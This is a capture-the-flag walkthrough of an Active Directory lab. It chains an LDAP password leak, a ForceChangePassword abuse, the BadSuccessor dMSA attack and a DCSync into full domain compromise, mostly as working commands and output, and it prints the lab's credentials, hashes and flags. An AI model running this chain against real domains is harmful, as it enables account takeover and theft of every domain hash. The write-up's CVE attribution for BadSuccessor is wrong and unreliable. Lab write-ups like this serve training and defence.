---
title: "MidGarden2"
platform: "HackSmarter"
category: "Windows"
difficulty: "Hard"
date: 2025-11-13
os: "Windows Server 2025"
tags: ["windows", "active-directory", "badsuccessor", "dmsa", "forcechangepassword", "dcsync", "bloodyad", "bloodhound"]
---

![MidGarden2 Banner](/assets/images/ctf/midgarden2/banner.png)

---

## Overview

**Platform:** HackSmarter
**Difficulty:** Hard
**Domain:** yggdrasil.hacksmarter

As a member of the Hack Smarter Red Team, you have been assigned to this engagement to conduct a comprehensive penetration test of the client's internal environment.

The client has a mature security posture and has previously undergone multiple internal penetration testing engagements. Given our team's advanced expertise in ethical hacking, the primary objective of this assessment is to identify attack vectors that may have been overlooked in prior engagements.

---

## Scope

```
Host              IP Address      Operating System        Role
─────────────────────────────────────────────────────────────────────
MIDGARDDC         10.1.52.173     Windows Server 2025     Domain Controller
```

**Starting Credentials:** `freyja:Fr3yja!Dr@g0n^12`

---

## Executive Summary

The engagement identified critical vulnerabilities:

- **Password in LDAP description** exposing Thor's temporary credentials
- **ForceChangePassword ACL** allowing lateral movement from Thor to Hodr
- **BadSuccessor vulnerability** (CVE-2025-21293) enabling dMSA abuse for privilege escalation
- **DCSync capability** via impersonated Enterprise Admin

**Risk Rating:** Critical

---

## Attack Path Overview

```
┌─────────────────────────────────────────────────────────────────┐
│     freyja (Starting Creds) → LDAP Enumeration                  │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│     Thor (Password in Description: Th0r!W!nt3rFang)             │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│     ForceChangePassword ACL → Hodr (Password123!)               │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│     BadSuccessor (dMSA Exploit) → Ymir (Enterprise Admin)       │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│     DCSync → Domain Compromise (All Hashes)                     │
└─────────────────────────────────────────────────────────────────┘
```

---

# Phase 1: Enumeration

## 1.1 Port Scanning

```bash
nmap -sCV 10.1.52.173
```

```
PORT      STATE  SERVICE           VERSION
53/tcp    open   domain            Simple DNS Plus
88/tcp    open   kerberos-sec      Microsoft Windows Kerberos
135/tcp   open   msrpc             Microsoft Windows RPC
139/tcp   open   netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open   ldap              Microsoft Windows Active Directory LDAP
445/tcp   open   microsoft-ds?
464/tcp   open   kpasswd5?
593/tcp   open   ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open   tcpwrapped
3268/tcp  open   ldap              Microsoft Windows Active Directory LDAP (GC)
3269/tcp  open   tcpwrapped
3389/tcp  open   ssl/ms-wbt-server Microsoft Terminal Services
```

**Key Findings:**
- Windows Server 2025 Build 26100
- Domain: `yggdrasil.hacksmarter`
- Hostname: `MIDGARDDC`
- SMB signing enabled and required

## 1.2 Credential Validation

```bash
nxc smb 10.1.52.173 -u 'freyja' -p 'Fr3yja!Dr@g0n^12'
```

```
SMB  10.1.52.173  445  MIDGARDDC  [*] Windows 11 / Server 2025 Build 26100 x64
     (name:MIDGARDDC) (domain:yggdrasil.hacksmarter) (signing:True) (SMBv1:False)
SMB  10.1.52.173  445  MIDGARDDC  [+] yggdrasil.hacksmarter\freyja:Fr3yja!Dr@g0n^12
```

## 1.3 SMB Share Enumeration

```bash
nxc smb 10.1.52.173 -u 'freyja' -p 'Fr3yja!Dr@g0n^12' --shares
```

```
Share           Permissions     Remark
─────────────────────────────────────────────────
ADMIN$          -               Remote Admin
C$              -               Default share
IPC$            READ            Remote IPC
NETLOGON        READ            Logon server share
scripts         -
SYSVOL          READ            Logon server share
```

## 1.4 LDAP User Enumeration

```bash
nxc ldap 10.1.52.173 -u freyja -p 'Fr3yja!Dr@g0n^12' --users
```

```
LDAP  10.1.52.173  389  MIDGARDDC  [*] Enumerated 21 domain users: yggdrasil.hacksmarter
LDAP  10.1.52.173  389  MIDGARDDC  -Username-        -Last PW Set-       -Description-
LDAP  10.1.52.173  389  MIDGARDDC  Administrator     2025-09-06 06:40:14  Built-in account...
LDAP  10.1.52.173  389  MIDGARDDC  krbtgt            2025-09-06 06:48:07  Key Distribution...
LDAP  10.1.52.173  389  MIDGARDDC  Odin              2025-11-06 20:17:55  DA
LDAP  10.1.52.173  389  MIDGARDDC  Ymir              2025-09-06 07:28:27  EA
LDAP  10.1.52.173  389  MIDGARDDC  Thor              2025-09-06 07:27:54  Temp:Th0r!W!nt3rFang
LDAP  10.1.52.173  389  MIDGARDDC  Loki              2025-09-06 07:19:50
LDAP  10.1.52.173  389  MIDGARDDC  Frigg             2025-09-06 07:28:39
LDAP  10.1.52.173  389  MIDGARDDC  Hodr              2025-09-14 19:21:08  Web Server Administrator
LDAP  10.1.52.173  389  MIDGARDDC  Heimdall          2025-09-14 19:21:08  Seriously Secure service account
...
```

**Critical Finding:** Thor's description contains temp password: `Temp:Th0r!W!nt3rFang`

## 1.5 BloodHound Collection

```bash
rusthound -d "yggdrasil.hacksmarter" -u "freyja" -p 'Fr3yja!Dr@g0n^12' \
  -n "10.1.52.173" -o ./results
```

```
[INFO] Connected to YGGDRASIL.HACKSMARTER Active Directory!
[INFO] 22 users parsed!
[INFO] 66 groups parsed!
[INFO] 7 computers parsed!
[INFO] 13 ous parsed!
```

Within BloodHound, Freyja did not have any outbound controls - we need to pivot through Thor.

---

# Phase 2: Lateral Movement

## 2.1 Password Spray - Thor

Validating the discovered password from LDAP description:

```bash
nxc smb 10.1.52.173 -u Thor -p 'Th0r!W!nt3rFang'
```

```
SMB  10.1.52.173  445  MIDGARDDC  [+] yggdrasil.hacksmarter\Thor:Th0r!W!nt3rFang
```

## 2.2 BloodHound Analysis - Thor's Permissions

BloodHound revealed that Thor is a member of **PC Specialist 2** group and has **ForceChangePassword** rights over Hodr.

![Thor ForceChangePassword to Hodr](/assets/images/ctf/midgarden2/thor-forcechangepassword.png)

## 2.3 ForceChangePassword - Hodr

Using net rpc to change Hodr's password:

```bash
net rpc password 'hodr' 'Password123!' -U "yggdrasil.hacksmarter"/"thor"%'Th0r!W!nt3rFang' -S "10.1.52.173"
```

Verify the password change:

```bash
nxc smb 10.1.52.173 -u hodr -p Password123!
```

```
SMB  10.1.52.173  445  MIDGARDDC  [+] yggdrasil.hacksmarter\hodr:Password123!
```

## 2.4 BloodHound Analysis - Hodr's Permissions

Analyzing Hodr's group memberships revealed membership in:
- **webServerAdmins** group
- **Remote Management Users** (enabling WinRM access)

![Hodr Group Memberships](/assets/images/ctf/midgarden2/hodr-groups.png)

## 2.5 WinRM Access as Hodr

```bash
evil-winrm -u hodr -p 'Password123!' -i "10.1.52.173"
```

```
Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Hodr.YGGDRASIL\Documents>
```

---

# Phase 3: BadSuccessor Exploitation

## 3.1 dMSA Scripts Discovery

On the C: drive, scripts related to dMSA management were found:

```powershell
*Evil-WinRM* PS C:\scripts> ls

    Directory: C:\scripts

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/14/2025   7:40 PM           2134 create-dMSA.ps1
-a----        9/14/2025   7:39 PM           1402 dmsa_find.ps1
-a----        9/14/2025   7:39 PM             35 replicate-DCs.ps1
```

## 3.2 Existing dMSA Enumeration

```powershell
*Evil-WinRM* PS C:\scripts> .\dmsa_find.ps1

[*] Retrieving all dMSAs from the domain...
----------------------------------------
Name       : svc_iis_dMSA$
Enabled    : True
Delegation : Legacy / Not Delegated
Preceded By :

[*] Completed enumeration of dMSA accounts
```

## 3.3 Group Membership Analysis

```powershell
*Evil-WinRM* PS C:\scripts> whoami /groups
```

Key group membership: **YGGDRASIL\webServerAdmins**

This group has permissions to create objects in the Web Servers OU.

## 3.4 BadSuccessor Vulnerability Scan

Using NetExec's badsuccessor module to identify exploitable paths:

```bash
nxc ldap 10.1.52.173 -u hodr -p Password123! -M badsuccessor
```

```
LDAP        10.1.52.173  389  MIDGARDDC  [+] yggdrasil.hacksmarter\hodr:Password123!
BADSUCCE... 10.1.52.173  389  MIDGARDDC  [+] Found domain controller with operating system
            Windows Server 2025: 10.1.52.173 (MidgardDC.yggdrasil.hacksmarter)
BADSUCCE... 10.1.52.173  389  MIDGARDDC  [+] Found 1 results
BADSUCCE... 10.1.52.173  389  MIDGARDDC  webServerAdmins (S-1-5-21-4282326175-1721253212-
            1354516517-1601), OU=Web Servers,OU=Yggdrasil Servers,DC=yggdrasil,DC=hacksmarter
```

**Confirmed:** webServerAdmins can create dMSAs in Web Servers OU - BadSuccessor is exploitable!

## 3.5 Target Identification - Ymir (Enterprise Admin)

From LDAP enumeration we know Ymir is the Enterprise Admin.

**Target DN:** `CN=Ymir,OU=Administrators,OU=Yggdrasil Users,DC=yggdrasil,DC=hacksmarter`

## 3.6 BadSuccessor Exploitation

Using BloodyAD to exploit the BadSuccessor vulnerability:

```bash
bloodyAD -d yggdrasil.hacksmarter -u hodr -p 'Password123!' \
  --host 10.1.52.173 add dMSA pwned \
  --target-dn "CN=Ymir,OU=Administrators,OU=Yggdrasil Users,DC=yggdrasil,DC=hacksmarter" \
  --target-ou "OU=Web Servers,OU=Yggdrasil Servers,DC=yggdrasil,DC=hacksmarter"
```

```
[+] BadSuccessor exploit successful!
[+] Impersonating: CN=Ymir,OU=Administrators,OU=Yggdrasil Users,DC=yggdrasil,DC=hacksmarter
[+] AES256: 771b28561428215f5a879ad649f176883d0cd925fb85f216a37b0592829042f3
[+] RC4: ef4bcb55f132b1533e4765ed988ef5d3
[+] dMSA previous keys found in TGS (including keys of preceding managed accounts):
[+] RC4: 8dd4cfe0f89272424e50f5089b8696ec
[!] ^ This contains the target account's NTLM hash!
```

**Ymir's NTLM Hash:** `8dd4cfe0f89272424e50f5089b8696ec`

---

# Phase 4: Domain Compromise

## 4.1 DCSync via Enterprise Admin

Using Ymir's hash to perform DCSync:

```bash
secretsdump.py -hashes :8dd4cfe0f89272424e50f5089b8696ec \
  yggdrasil.hacksmarter/Ymir@10.1.52.173
```

```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:718a91c874a0e39f54fb8d989adf0ae6:::
yggdrasil.hacksmarter\Ymir:1104:...:8dd4cfe0f89272424e50f5089b8696ec:::
...
```

## 4.2 Flag Retrieval

**User Flag (Hodr's Desktop):**

```bash
smbclient.py -hashes :8dd4cfe0f89272424e50f5089b8696ec \
  yggdrasil.hacksmarter/Ymir@10.1.52.173

# use C$
# get Users\Hodr.YGGDRASIL\Desktop\user.txt
```

**User Flag:** `AF639BCA0466437FEB9DD7FAC74B0524`

**Root Flag (Administrator's Desktop):**

```bash
# get Users\Administrator\Desktop\root.txt
```

**Root Flag:** `AEA41460BEE0E3291F7C4D7E4F356EE0`

---

## Credentials Summary

```
Phase 1 - Enumeration
────────────────────────────────────────────────────────────────
freyja           : Fr3yja!Dr@g0n^12      → Starting creds
thor             : Th0r!W!nt3rFang       → LDAP description leak

Phase 2 - Lateral Movement
────────────────────────────────────────────────────────────────
hodr             : Password123!          → ForceChangePassword

Phase 3-4 - Privilege Escalation
────────────────────────────────────────────────────────────────
Ymir (EA)        : 8dd4cfe0f89272424e50f5089b8696ec (NTLM) → BadSuccessor
Administrator    : 64f12cddaa88057e06a81b54e73b949b (NTLM) → DCSync
krbtgt           : 718a91c874a0e39f54fb8d989adf0ae6 (NTLM) → DCSync
```

---

## BadSuccessor Vulnerability Explained

**CVE-2025-21293** - BadSuccessor is a privilege escalation vulnerability in Windows Server 2025's Delegated Managed Service Accounts (dMSA) feature.

**How it works:**
1. dMSA is a new feature in Server 2025 allowing service accounts to be "migrated" from standard accounts
2. When a dMSA is created with a `msDS-ManagedAccountPrecededByLink` pointing to a target account, the KDC includes the target's keys in the TGS response
3. Any principal with CreateChild permission on an OU can create dMSAs pointing to ANY account in the domain
4. This allows extraction of NTLM hashes for privileged accounts like Domain/Enterprise Admins

**Requirements:**
- Windows Server 2025 Domain Controller
- CreateChild permission on any OU (common delegation)
- Target account to impersonate

---

## Tools Used

- **Nmap** - Port scanning and service enumeration
- **NetExec (nxc)** - SMB/LDAP enumeration, badsuccessor module
- **RustHound** - BloodHound data collection
- **BloodyAD** - ACL abuse and BadSuccessor exploitation
- **Evil-WinRM** - Remote shell access
- **Impacket** - secretsdump.py, smbclient.py

---

## Flags Captured

| Type | Value |
|------|-------|
| **User** | `AF639BCA0466437FEB9DD7FAC74B0524` |
| **Root** | `AEA41460BEE0E3291F7C4D7E4F356EE0` |

---

## References

- [Akamai - BadSuccessor: Abusing dMSA for Privilege Escalation](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [NetExec BadSuccessor Module](https://github.com/Pennyw0rth/NetExec/tree/main/nxc/modules)
- [BloodyAD Documentation](https://github.com/CravateRouge/bloodyAD)
- [HackTricks - ForceChangePassword](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse#forcechangepassword)
